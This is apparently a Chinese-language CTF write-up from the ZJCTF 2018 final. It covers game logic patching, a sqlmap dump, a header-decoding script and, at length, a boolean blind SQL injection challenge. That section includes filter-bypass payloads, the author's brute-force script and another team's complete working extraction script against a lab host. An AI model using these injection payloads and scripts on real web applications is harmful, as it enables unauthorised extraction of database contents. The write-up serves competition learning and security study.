# ZJCTF2018 final
记录一下省赛线下这一天我参与的题目，以作留存。

## 0x01你追我赶
看到这道题，先抓包，发现包内有静态 js 文件：`/static/game/index.js`

而且源码里也提示题目是 offline，可以想见这道题目的总体思路是修改本地逻 辑。 这是一个以 chrome 恐龙游戏为基础的题目，在以前也做到过，不同的是，在 home 页面可以看到游戏规则里写坚持 1 分钟即可获得 flag。因此改分数是不太对的， 所以我选择搜索碰撞逻辑然后修改,去掉了 else 后面调用 gameover 的代码，这样 就不会碰撞了：
![](ZJCTF2018%20final/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-11-05%20%E4%B8%8A%E5%8D%888.56.05.png)
五分钟后还原代码，然后用 burp 拦截 ajax 请求，在回复报文中获得 flag。 当然，在写 wp 复看这段代码的时候还找到了 post 请求的代码段，这样自主发包 想必应该也是一种思路。
决赛后新加post成功后的四张图片像素位比较，因为misc我不管，在此就不多赘述。
<br>

##  0x02知法懂法
Sqlmap扫id字段dump出整个数据库，比对每一条和网络安全法有什么区别。发现第二十九条与标准法不同。
然后猜谜，该提交什么呢，往哪里提交呢？ctf真是一个猜谜游戏，爆了网页，爆了属性名，最后发现提交正确的第二十九条内容即可获得flag
<br>

## 0x03再快一点
原题，存在于各类基础ctf题库，脚本如下：
```python
import requests
import base64

url= ‘http://172.21.1.102:61234/hC1DU4oEZ3’
s = requests.Session()
flag = base64.b64decode(base64.b64decode(s.get(url).headers[‘flag’]).decode(‘utf-8’).split(‘:’)[1]) 
postdata = {‘margin’:flag}
*print*(s.post(url, data=postdata).text)
```
<br>

## 0x04Blind
写这篇writeup就想记录一下这个耻辱，自己拱手相让的冠军真的很令人难受。
### 基础性判断判断：
当被字符等截断前的数字为1-5时返回you find it!，被过滤字符返回Probably you need an other mothod.，其余返回hide more deep。
发现黑名单字符为：`> <> != ' %27 # and union 空格`
未被过滤的字符为：`() ^ or %20 - CHAR() "  %00 select <`
确定是字符型注入：`1-1`结果未变
所以暂且把hide more deep当作**错误值**，you find it!当作**正确值**，因为需要用`or`连接，所以第一位要先取错误值，比如`0`，然后or后拟构造出一个true，让查询返回正确，否则返回错误。过程中发现，虽然`'`被过滤，但是`”`却可以完成构造，说明字符串被双引号闭合，所以完成poc也不成问题。

### 最后构筑payload结构如下：
 `0"or"1"^"1"^(xxxxxx)--%20` 
 
ps1: 我🐎也不知道狗哥在帮试payload的时候经历了什么，核心payload的前面要加”1”^”1”，讲道理这样能用的话，只要在核心前加“0”即可，不过令人奇怪的是：or”1”^”1”和or1^1返回的结果有差异，可能数据库是MSSQL之类的原因。

ps2：由于当时我在尝试了> 和<>没有试<，理所当然觉得<也被过滤了，是我的失误，所以最后用减号，这大大降低了脚本的优势，以至于我后来一直选择burp工程锤来爆破。
不管怎么说，总算是能用了。

### 编写脚本：
脚本里用到的payload如下：
 `0"or"1"^"1"^(ascii(substr(database(),{0},1))-{1})--%20` 
脚本编辑如下：
```python
# POST boolean blind sql injection
import requests

url = 'http://172.21.1.102:61234/iFmn2H0UOq'
s = requests.Session()
key = ''

for pos in range(1,2): 
	for mid in range(0,127):
		payload = r'0"or"1"^"1"^(ascii(substr(database(),{0},1))-{1})--%20'.format(pos,mid)
		data = {'id':payload,'Submit':'Search'} 
		r = s.post(url, data=data)
		print(len(r.text))
		# if b"Hide more deep" in r.content:
		if len(r.text)==647:
			break

	key += chr(mid)
	print(key)
print("result:",key)
```
很遗憾，不知道为何，同样的payload，在burp下能爆出来，脚本就会出现问题，原因大抵是python对payload中双引号的处理可能和正常报文有所不同，我也不是特别熟悉request模块，所以在此即然burp能用，就索性用了burp。

### burp上爆肝一般的爆破开始：
使用payload如下：
`0"or"1"^"1"^(ascii(substr(((select group_concat(xxx) from xxx)),{0},1))-{1})--%20`
* 爆数据库名：
`0"or"1"^"1"^(ascii(substr((((select group_concat(schema_name) from information_schema.schemata))),{0},1))-{1})--%20`
获得`information_schema tips useless`
* 爆表名：
`0"or"1"^"1"^(ascii(substr(((SELECT group_concat(table_name) FROM information_schema.tables)),{0},1))-{1})--%20`
800字长。。。。。
* 爆字段名：
`0"or"1"^"1"^(ascii(substr(((select group_concat(xxx) from xxx)),{0},1))-{1})--%20`
1200字长。。。。。没有写脚本真的很僵。所以就在这里卡住了。。。
中间还用了max和min,爆出了zjctf这个表名，判断是useless.zjctf，然而依旧无济于事，最终没找到正确的列名比赛就结束了。
现在想想，应该是去解决我脚本上的问题，而不是头铁来用burp爆。

### 拜读ch1p战队wp后的总结和思考
几个点：
1. 首先，他们和我一样，burp上正确的payload用在脚本中就会出现问题，他们的结论是`--`上会有问题，这我就没有深究出来。而且，他们及时转换策略，将`--`换成了`or "-`，使脚本能够成功运行。哎
2. 在poc的设计上，使用`/**/`代替空格，我用`^()`取代了空格；`in`取代比较字符，所以用了substr却没加ascii。没有使用`<`我觉得在这句话来讲是有问题的，首先是编写脚本的时候就不能用二分法加快搜索速度，其次是不区分大小写的特性导致了后面爆writeup出现问题。

**其部分wp如下：**
在当前库tips中，并没有发现flag ,需要进行跨库查询，首先需要先在information_schema库中，获得所有的库名。

payload:`payload = '-1" or substr((select group_concat(table_schema) from information_schema.tables where table_schema not in ("information_schema","tips")),%s,1) in ("%s") or "0'`

得到还存在一个名为userless 的数据库，查询其表段，得知存在zjctf 表，flag 在其content 字段。
跑出的 flag 为：zjctf{aa0_bl1nd_hha} 但是上交时提示错误。懵了一会儿后突然想起in 是不区分大小写的。 那么猜测大写字母，针对 flag 中唯一的单词，尝试提交aa0_Bl1nd_hha 成功！

下面是完整的脚本：
```python
"""
    Author:Li4n0
    Date:2018-11-4
"""
import requests
import string

# in 不区分大小写 需要自己再判断一次

url = 'http://172.21.1.102:61234/iFmn2H0UOq'
#payload = '-1" or substr((select group_concat(column_name) from information_schema.columns where table_name in ("zjctf")),%s,1) in ("%s") or "0'

#payload = '-1" or substr((select group_concat(table_schema) from information_schema.tables where table_schema not in ("information_schema","tips")),%s,1) in ("%s") or "0'

payload = '-1" or substr((select group_concat(content) from useless.zjctf),%s,1) in ("%s") or "0'
key = ''
length = 1
while True:
    for i in string.printable.replace('#', ''):
        data = {
            'id': payload.replace(' ', '/**/') % (str(length), i),
            'Submit': 'Search'
        }
        r = requests.post(url, data=data)
        if 'You find' in r.text:
            key += i
            length += 1
            break
    print(key)
```
个人认为，这个脚本，精髓就在where后的`in`和`not in`，败笔在(“%s”)前的`in`。值得吸收的点还有使用`for i in string.printable.replace('#', '')`来爆破字符，比我的脚本要精确一点。不管如何，它能跑出答案，一切都无所谓了。同样是九年义务制教育，他们现在比我更加优秀。


END:)


